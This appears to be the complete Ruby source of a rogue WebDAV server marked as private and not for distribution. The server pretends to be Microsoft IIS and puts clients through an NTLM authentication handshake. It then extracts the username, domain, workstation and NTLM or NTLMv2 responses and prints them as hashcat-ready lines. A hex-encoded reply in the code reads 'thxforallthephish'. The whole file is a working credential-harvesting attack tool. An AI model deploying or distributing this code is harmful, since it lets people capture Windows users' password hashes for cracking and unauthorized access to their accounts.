# Under FrieNDA, rights granted by audibleblink
# DO NOT DISTRIBUTE

$stdout.sync = true
require 'sinatra/base'
require 'sinatra/webdav'
require 'ipaddr'
require 'rubyntlm'

$HOST = ARGV[0] || '192.168.205.1'
$PORT = ARGV[1] || 9090

puts "="*40
puts "WebDAV Path: \\\\#{IPAddr.new($HOST).to_i}@#{$PORT}\\file"
puts "="*40

class Sinatra::Base
  module HashTools
    CHALLENGE = 'TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQL'+
      'ODgAAAA9TAE0AQgACAAYARgBUAFAAAQAWAEYAVABQAC0AVABPAE8ATABCAE8AWAAEABIAZgB0AHAA'+
      'LgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAxADYALgBmAHQAYgAuAGwAbwBjAGEAbAAFA'+
      'BIAZgB0AHAALgBsAG8AYwBhAGwAAAAAAA=='

    def get_type(data)
      return 0 unless data
      return 1 if Base64.decode64(data).size == 40
      return 3
    end

    def extract_hash_data(data)
      ntlm = Net::NTLM::Message::Type3.new.decode64(data)
      output = {
        user:     ntlm.user.gsub(/\x00/, ''),
        hostname: ntlm.workstation.gsub(/\x00/, ''),
        domain:   ntlm.domain.gsub(/\x00/, ''),
        type:     ntlm.ntlm_version,
        chal:     Net::NTLM::Message.decode64(CHALLENGE).challenge.to_s(16).reverse
      }

      if output[:type] == :ntlmv2
        output[:lm] = ntlm.ntlm_response[0..15].unpack("H*").first.upcase
        output[:nt] = ntlm.ntlm_response[16..-1].unpack("H*").first.upcase
      else
        output[:lm] = ntlm.lm_response.unpack("H*").first.upcase
        output[:nt] = ntlm.ntlm_response.unpack("H*").first.upcase
      end
      output
    end

    def to_hashcat(h)
      if h[:type] == :ntlmv2
        "#{h[:user]}::#{h[:domain]}:#{h[:chal]}:#{h[:lm]}:#{h[:nt]}"
      else
        "#{h[:user]}::#{h[:hostname]}:#{h[:lm]}:#{h[:nt]}:#{h[:chal]}"
      end
    end
  end
end

class WebDav < Sinatra::Base
  register Sinatra::WebDAV
  helpers HashTools

  configure do |conf|
    conf.bind = $HOST
    conf.port = $PORT
  end

  before do
    headers['Connection']   = "Keep-Alive"
    headers['Content-Type'] = "text/html"
    headers['Keep-Alive']   = "timeout=5, max=100"
    headers['Server']       = "Microsoft-IIS/7.5"
  end

  get '/' do
    @host, @port = IPAddr.new($HOST).to_i, $PORT
    erb :index
  end

  options '/*' do
    headers['Allow'] = "OPTIONS,GET,HEAD,POST,PUT,PROPFIND,PROPPATCH,MKCOL,COPY,MOVE,LOCK,UNLOCK"
  end

  propfind '/*' do
    auth_header = request.env['HTTP_AUTHORIZATION']
    auth_header = auth_header.split(' ')[1] if auth_header

    case get_type(auth_header)
    when 0
      # First WebDAV visit; send an authorization request
      headers['WWW-Authenticate'] = "NTLM"
      status 401
    when 1
      # They've been before and are trying to negotiate
      headers['WWW-Authenticate'] = "NTLM #{CHALLENGE}"
      status 401
    when 3
      # They're responding to the challnege which means we've got hashes
      hash_data = extract_hash_data(auth_header)
      puts to_hashcat(hash_data)
      "\x74\x68\x78\x66\x6f\x72\x61\x6c\x6c\x74\x68\x65\x70\x68\x69\x73\x68"
    end
  end
  run!() if app_file == $0
end
